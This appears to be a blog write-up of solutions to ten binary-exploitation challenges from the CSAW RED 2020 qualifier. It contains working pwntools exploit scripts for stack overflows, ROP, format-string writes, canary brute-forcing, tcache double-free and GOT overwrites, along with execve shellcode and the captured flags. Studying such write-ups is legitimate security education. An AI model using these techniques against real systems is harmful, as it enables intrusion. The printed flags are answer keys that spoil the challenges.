---
title: CSAW RED 2020 Qualifier (pwn)
date: 2020-09-29
slug: /writeups/csaw-red-2020-qual-pwn
excerpt: Solutions for pwn challenges from the CSAW RED 2020 Qualification Round.
---

Solutions for pwn challenges from the CSAW RED 2020 Qualification Round.

Some of the scripts in this document have been clipped for the sake of brevity.

# pwn - Feast
> We've prepared a special meal for you. You just need to find it. (This is a 32 bit program) `nc pwn.red.csaw.io 5001`

## Files
- feast
- feast.c

## Solution
```
$ checksec feast
[*] '/home/darin/ctfs/red-2020/feast/feast'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Looking at the source, there is a trivial buffer-overflow in `vuln()` that is even pointed out to us in a comment.

```c
void vuln(){
    char buf[INPUTBUF];
    gets(buf); //ruh-roh
}
```

`gets()` does no boundary checking and we can write as much data as we want to `buf`. The length of the padding can be found with a debugger by subtracting the location of the return address from the argument to `gets()`.

```python
from pwn import *

exe = ELF("./feast")
r = remote("pwn.red.csaw.io", 5001)

r.sendlineafter("> ", b"A"*44 + p32(exe.sym["winner_winner_chicken_dinner"]))
r.interactive()
```

## Flag
```
flag{3nj0y_7h3_d1nN3r_B16_w1Nn3r!}
```

# pwn - helpme
> A young'un like you must be a tech whiz. Can you show me how to use this here computer? (This is a 64 bit program)
>
> `nc pwn.red.csaw.io 5002`

## Files
- helpme

## Solution
```
$ checksec helpme
[*] '/home/darin/ctfs/red-2020/helpme/helpme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This time, source is not given, so we can reverse this binary with something like Ghidra. The `main()` function does some initialization, then calls `vuln()` which is the part we're interested in.

```c
void vuln(void)
{
  char buf [0x20];

  printf("I can never remember the command to open flag files... \nCan you do it for me? \n> ");
  gets(buf);
  return;
}
```

Once again the binary uses `gets()`, so we can approach this in the same way as Feast. There is an unreferenced function called `binsh()` that is helpful to us.

```c
void binsh(void)
{
  system("/bin/sh");
  return;
}
```

All we need to do is return here. One small catch is that we need to insert an extra `ret` gadget to ensure that the stack is aligned to a 16-byte boundary before calling `system()`.

```python
from pwn import *

exe = ELF("./helpme")
r = remote("pwn.red.csaw.io", 5002)

rop = ROP(exe)
ret = rop.find_gadget(["ret"]).address
r.sendline(b"A"*40 + p64(ret) + p64(exe.sym["binsh"]))

r.interactive()
```

## Flag
```
flag{U_g07_5h311!_wh4t_A_h4xor!}
```

# pwn - Level 1 Spellcode
> Welcome Level 1 wizard! Write your own spellcode to pwn your way to the wizards' lab. (Attribution: the "spellcode" idea is not original, see [sourcery.pwnadventure.com](http://sourcery.pwnadventure.com/) (not part of the challenge.) For shellcoding references and examples, see "Hacking: the Art of Exploitation" by Jon Erickson or reference [shell-storm.org/shellcode](http://shell-storm.org/shellcode). For more Level 1 spells (not required to solve), see the D&D Player's Handbook, 5th edition. `nc pwn.red.csaw.io 5000`

## Files
- level\_1\_spellcode
- level\_1\_spellcode.c

## Solution
```
$ checksec level_1_spellcode
[*] '/home/darin/ctfs/red-2020/level1/level_1_spellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Things you love to see. Looking at the code, it appears that option 6 will take any shellcode we enter and run it.

```c
    else if (selection == 6){
        printf("Enter your spell code (up to %d bytes): > ", BUFSIZE);
        fflush(stdout);
        // Make sure there is something to run
        int code_length = read(0, shellcode, BUFSIZE);
        if(code_length > 0){
            void (*runthis)() = (void (*)()) shellcode;
            runthis();
        }
    }
```

pwntools can generate this shellcode for us, all we need to do is send it.

```python
from pwn import *

r = remote("pwn.red.csaw.io", 5000)

r.sendline("6")
r.sendline(asm(shellcraft.i386.sh()))

r.interactive()
```

## Flag
```
flag{w3lc0m3_t0_sh3llc0d1ng!!!}
```

# pwn - Actually not guessy
> No-one has ever guessed my favorite numbers. Can you?
>
> `nc pwn.red.csaw.io 5007`

## Files
- actually\_not\_guessy

## Solution
```
$ checksec actually_not_guessy
[*] '/home/darin/ctfs/red-2020/actually/actually_not_guessy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can throw this in Ghidra to reverse it. After cleaning up the decompilation a bit, `vuln()` is what we're interested in.

```c
void vuln(void)
{
  char buf [0x24];

  init();
  puts("Would you like to play a game? \nIf you can guess my three favorite numbers...you win!");
  fgets(buf,0x48,stdin);
  return;
}
```

This is a fairly standard ROP challenge. Since we're in 32-bit, some things are a bit easier. Also note that there is a function that will print the flag for us if we give it the right arguments.

```c
void all_I_do_is_win(uint param_1, uint param_2, uint param_3)
{
  char flagbuf [0x28];
  FILE *flag;

  if (param_1 == 0x600dc0de) {
    if (param_2 == 0xacce5515) {
      if (param_3 == 0xfea51b1e) {
        flag = fopen("flag.txt","r");
        if (flag == (FILE *)0x0) {
          puts("If you\'re seeing this, the flag file is missing. Please let an admin know!");
          exit(0);
        }
        fgets(flagbuf, 0x28, flag);
        puts(flagbuf);
        exit(0);
      }
      puts("So close!");
    }
    else {
      puts("You\'re getting there...");
    }
  }
  else {
    puts("Not quite.");
  }
  return;
}
```

Here's the stack layout and all the code:

```
buf     AAAA
        AAAA
        AAAA
        ...
return  all_I_do_is_win
return  AAAA
arg     0x600dc0de
arg     0xacce5515
arg     0xfea51b1e
```



```python
from pwn import *

exe = ELF("./actually_not_guessy")
r = remote("pwn.red.csaw.io", 5007)

r.sendline(b"A"*44 + p32(exe.sym["all_I_do_is_win"]) + b"AAAA" + p32(0x600dc0de) + p32(0xacce5515) + p32(0xfea51b1e))

r.interactive()
```

## Flag
```
flag{w0w_R_y0u_A_m1nD_r34D3r?}
```

# pwn - prisonbreak
> Roll a natural 20 to escape from Profion's dungeon! `nc pwn.red.csaw.io 5004`

## Files
- prisonbreak
- prisonbreak.c

## Solution
Looking at the source code, we see that the program will give us the flag if `roll_value` is 20. However, the `roll20()` function only gives values [1, 19].

```c
if(roll_value == 20){
    puts("   \"AWK! Natural 20. Natural 20.\"");
    puts("   You pry the bars apart with your bare hands and escape!");
    puts("");
    fflush(stdout);
    win();
}
```

```c
void win() {
    char buf[FLAGBUF];
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        puts("If you receive this output, then there's no flag.txt on the server -- message an admin on Discord.");
        puts("Alternatively, you may be testing your code locally, in which case you need a fake flag.txt file in your directory.");
        exit(0);
    }

    fgets(buf,FLAGBUF,f);
    printf("%s",buf);
    exit(0);
}

void roll20(){
    // Random number generator
    time_t t;
    srand((unsigned) time(&t));
    roll_value = rand() % 19 + 1;
}
```

There is a format-string vulnerability in the middle of `runChallenge()`, as it feeds our input directly into `printf()`

```c
getInput(PHRASELENGTH, phrase);
puts("");
printf("   \"AWK! ");
printf(phrase);
```

We start by finding the offset in our format string until we hit our input. After some trial and error, we find that we hit our input starting at offset 6.

```
What do you say? >AAAAAAAA %6$p

"AWK! AAAAAAAA 0x4141414141414141," says the parrot.
```

We want to write to `roll_value`, which has an 8-byte address (since we're in 64-bit). This means we have just 20-8=12 bytes to write the value there. The winning payload is:

```
'%20c%7$n' + p64(roll_value)
```

Since index 6 is the start of our format string, index 7 is 8 bytes after that, the address of `roll_value`. We print 20 bytes of padding, then write it with the `n` specifier.

## Flag
```
flag{Y0u_s41d_th3_wr1t3_th1ng}
```

# pwn - coalmine
> This bird will definitely protect me down in the mine.
>
> `nc pwn.red.csaw.io 5005`

## Files
- coalmine

## Solution
```
$ checksec coalmine
[*] '/home/darin/ctfs/red-2020/coalmine/coalmine'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Opening this in Ghidra, we see that there's a custom stack canary implementation.

```c
void carry_bird_into_mine(void)
{
  FILE *canary_file;

  canary_file = fopen("birdy.txt","r");
  if (canary_file == (FILE *) 0x0) {
    puts("Looks like the bird has left the server. -- Please let an admin know on Discord!");
    printf("If you\'re running this locally, you\'ll need a birdy of your own!");
    exit(0);
  }
  fread(&global_birdy, 0x1, 0x8, canary_file);
  fclose(canary_file);
  return;
}

void name_it(void)
{
  size_t length;
  char buf [0x20];
  undefined name [0x20];
  long canary;

  canary = global_birdy;
  printf("How many letters should its name have?\n> ");
  fgets(buf, 0x20, stdin);
  length = atoi(buf);
  printf("And what\'s the name? \n> ");
  read(0,name,length);
  if (memcmp(&canary, &global_birdy, 0x8) != 0) {
    puts("*** Stack Smashing Detected *** : Are you messing with my canary?!");
    exit(0);
  }
  printf("Ok... its name is %s\n",name);
  fflush(stdout);
  return;
}
```

The vulnerability here is that the canary is not randomized on each run - its value is stored in a file. Since we have great control of how many bytes we overwrite, we can simply overwrite the bottom byte of the canary only. By trying all 256 possible values for this byte until we find the one that does not exit, we will have recovered one byte of the canary. Continuing this process for eight bytes gives us the canary.

```python
def attempt(offset, canary):
    with context.local(log_level="error"):
        r = remote("pwn.red.csaw.io", 5005)
        r.sendlineafter("> ", str(offset+32))
        r.sendafter("> ", b"A"*32 + canary)
        good = b"***" not in r.recv()
        r.close()
        return good

canary = b""
for offset in range(1, 9):
    for k in range(256):
        if attempt(offset, canary + bytes([k])):
            canary += bytes([k])
            break
```

We find that the canary is `NECGLSPQ`. From here, it is a straightforward ROP challenge, as described in "pwn - Actually not guessy". There is a function that will print the flag to return to.

```c
void tweet_tweet(void)
{
  char flagbuf [0x28];
  FILE *flag;

  flag = fopen("flag.txt", "r");
  if (flag == (FILE *)0x0) {
    puts(
        "If you receive this output, then there\'s no flag.txt on the server -- message an admin onDiscord."
        );
    puts(
        "Alternatively, you may be testing your code locally, in which case you need a fakeflag.txt file in your directory."
        );
    exit(0);
  }
  fgets(flagbuf, 0x28, flag);
  puts(flagbuf);
  exit(0);
}
```

## Flag
```
flag{H0w_d1d_U_g37_pA5t_mY_B1rD???}
```

# pwn - Level 2 Spellcode
> Level up your spellcoding! No source code this time. `nc pwn.red.csaw.io 5009`

## Files
- level\_2\_spellcode

## Solution
```
$ checksec level_2_spellcode
[*] '/home/darin/ctfs/red-2020/level2/level_2_spellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

This is (as expected) similar to Level 1. However, looking at the decompilation reveals that the program reads 5 null bytes into the middle of our shellcode.

```c
puts("Good idea, but I forget how to cast that spell.");
puts("Can you remind me?\n");
printf("Enter your spell code (up to %d bytes): > ",0x28);
fflush(stdout);
sVar1 = read(0, shellcode, 0x28);
fd = open("/dev/zero", 0);
read(fd, shellcode+0xc, 0x5);
if (0 < sVar1) {
  (*(code *)shellcode)();
}
```

To solve this, we can put the bulk of our shellcode after this part, and use the first few bytes (before the nulls) to jump down to the main shellcode. Here's what that looks like in memory:

```
=> 0xfff62864:  xor    edx,edx
   0xfff62866:  jmp    0xfff62875
   0xfff62868:  nop
   0xfff62869:  nop
   0xfff6286a:  nop
   0xfff6286b:  nop
   0xfff6286c:  nop
   0xfff6286d:  nop
   0xfff6286e:  nop
   0xfff6286f:  nop
       ...
   0xfff62875:  xor    eax,eax
   0xfff62877:  push   eax
   0xfff62878:  push   0x68732f2f
   0xfff6287d:  push   0x6e69622f
   0xfff62882:  mov    ebx,esp
   0xfff62884:  push   eax
   0xfff62885:  push   ebx
   0xfff62886:  mov    ecx,esp
   0xfff62888:  mov    al,0xb
   0xfff6288a:  int    0x80
```

Sending this gives a shell.

## Flag
```
flag{n1c3_h4nd-cr4f73d_sp3llc0d3}
```

# pwn - worstcodeever
> my friend writes some bad code `nc pwn.red.csaw.io 5008`

## Files
- worstcodeever
- worstcodeever.c
- Makefile
- libc-2.27&#46;so

## Solution
```
$ checksec worstcodeever
[*] '/home/darin/ctfs/red-2020/worstcodeever/worstcodeever'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looking at the source, we are allowed to choose from 4 different options, a maximum of 50 times. The libc version is 2.27, which implies the use of tcache with no security checks. Note that we can not control the size of the allocations, but the pointers are not nulled after removing a friend, so there is a use-after-free and double-free vulnerability.

```c
if (friend_type[index] != 0)
    free(friend_list[index]->identity.name);
free(friend_list[index]);
// friend_type[index] NOT set to NULL!
```

We are allowed to edit our friends after they are freed, meaning that we can easily control the `fd` pointers on the tcache.

Since the binary does not use Full RELRO, we can leak a libc pointer from the GOT. Since we can only have 10 friends, I tried to minimize the number of friends we needed to make (just like real life).

```python
add_robot(0x41414141, 0x42424242)
add_robot(0x41414141, 0x42424242)
remove_friend(1)
edit_robot(1, exe.sym["friend_list"], 0x42424242)
add_robot(0x41414141, 0x42424242)
add_robot(exe.got["setvbuf"], 0x42424242)
display_friend(0)
r.recvuntil("barcode tag: ")
libc.address = int(r.recvline()) - libc.sym["setvbuf"]
log.info(f"LIBC @ 0x{libc.address:x}")
```

By getting `malloc()` to return a pointer at `friend_list`, we can simply edit friend number 3 to write an arbitrary pointer to `friend_list[0]`, then edit friend number 0 to write an arbitrary value to that pointer, all without creating any new friends. This first step set the value of friend 0 to `setvbuf@GOT`, and then displays friend 0 to leak a libc address. Overwriting `__free_hook` with a one gadget and removing a friend gives a shell.

```python
edit_robot(3, libc.sym["__free_hook"], 0x43434343)
edit_robot(0, libc.address + one_gadgets[1], 0)
remove_friend(1)
```

## Flag
```
flag{d03s_s0urc3_3v3n_h3lp}
```

# pwn - partycreation
> Hackers assemble !`nc pwn.red.csaw.io 5010`

## Files
- partycreation.c
- partycreation
- libc-2.27&#46;so

## Solution
```
$ checksec partycreation
[*] '/home/darin/ctfs/red-2020/party/partycreation'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Note that `getIntClean()` uses `atoi()` to get an integer, meaning we can input negative indices.

```c
int getIntClean(){
    char input[MAXINTLENGTH];
    getInput(MAXINTLENGTH, input);
    return atoi(input);
}
```

Since the binary does not use Full RELRO, we can easily leak and overwrite some GOT values. A good choice is `atoi()`, since it is called with our input as the first argument.

```python
view(-4)
r.recvuntil("Name:         ")
libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.sym["atoi"]
log.info(f"LIBC @ 0x{libc.address:x}")
```

From here we can use the rename function to write `system()` to `atoi@GOT`, and send `/bin/sh` to get a shell.

```python
rename(-4, p64(libc.sym["system"]))
r.sendline("/bin/sh")
```

## Flag
```
flag{3v3ry_CTF_t34m_15_4_p4r7y}
```

# pwn - Level 3 Spellcode
> Pit your shellcoding skills against an admin! May the best spellcoder win. `nc pwn.red.csaw.io 5011` (NOTE: if you experience issues writing to offset `0` in the shellcode array, try writing to offsets `1` and later. The challenge is solvable without needing that first byte. Edit posted Wednesday morning.)

## Files
- level\_3\_spellcode

## Solution
```
$ checksec level_3_spellcode
[*] '/home/darin/ctfs/red-2020/level3/level_3_spellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This one is certainly more interesting than the previous ones. Instead of letting us input all our shellcode at once, we can only input one byte at an offset. This sounds impossible, but the program writes some code to the shellcode first.

```
   0x6020c0:    nop
   0x6020c1:    nop
   0x6020c2:    nop
   0x6020c3:    nop
   0x6020c4:    nop
   0x6020c5:    nop
   0x6020c6:    nop
   0x6020c7:    nop
   0x6020c8:    nop
   0x6020c9:    nop
   0x6020ca:    nop
   0x6020cb:    nop
   0x6020cc:    nop
   0x6020cd:    nop
   0x6020ce:    nop
   0x6020cf:    nop
   0x6020d0:    nop
   0x6020d1:    nop
   0x6020d2:    nop
   0x6020d3:    nop
   0x6020d4:    nop
   0x6020d5:    nop
   0x6020d6:    nop
   0x6020d7:    nop
   0x6020d8:    nop
   0x6020d9:    nop
   0x6020da:    nop
   0x6020db:    nop
   0x6020dc:    nop
   0x6020dd:    nop
   0x6020de:    nop
   0x6020df:    sub    rsp,0x8
   0x6020e3:    jmp    0x400bf6
```

Our first goal will be to get more writes. We can do this by changing one byte at the last `jmp` instruction. After some trial and error with different offsets, we find that writing `0x28` at offset 36 will change the `jmp` instruction to this:

```
   0x6020e3:    jmp    0x400c10
```

This loops us back to the before the input function is called. Note that testing this on Ubuntu will likely cause a segfault due to stack alignment, but testing this on the remote reveals that the remote libc does not care about stack alignment and continues without a problem.

Eventually, the goal should be to write the shellcode where the nops currently are. However, writing this one byte at a time (and executing it each time) means that the program will encounter an invalid instruction when we are not done writing it yet. Therefore, we need a way to jump over the nops temporarily.

We would like to write `0xeb 0x21` which is `jmp 0x6020e3`, but we can not write the first byte or else it will become `0xeb 0x90` which will jump too far. To fix this, we will first write a `0x68` to offset 0 to turn the first instruction into a `push 0xffffffff90909090`. Then, we'll write the `0x21`, which makes the first instruction `push 0xffffffff90909021`. Lastly, we'll write the `0xeb` to get the `jmp 0x6020e3` we want.

Now, we simply write the shellcode one byte at a time. However, we must keep in mind that we will later "enable" this shellcode by changing the offset in our first jump instruction. This byte is at offset 1, and we can not write null bytes, so the lowest place we can start writing the shellcode is at offset 3. Once the shellcode is written, flipping byte 1 to a `0x01` enables the shellcode and we get a shell.

```python
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.recvuntil("Counterspell")
r.sendline("3")
write(36, b"\x28") # loop
write(0, b"\x68") # nop
write(1, b"\x21") # jump
write(0, b"\xeb") # jump

for k, b in enumerate(sc):
    write(k+3, b'%c'%b)

write(1, b"\x01")
r.interactive()
```

## Flag
```
flag{pu7_0n_y0ur_m1rr0r_5h4d35_4nd_t4k3_a_b0w_5p3llc0d3r}
```
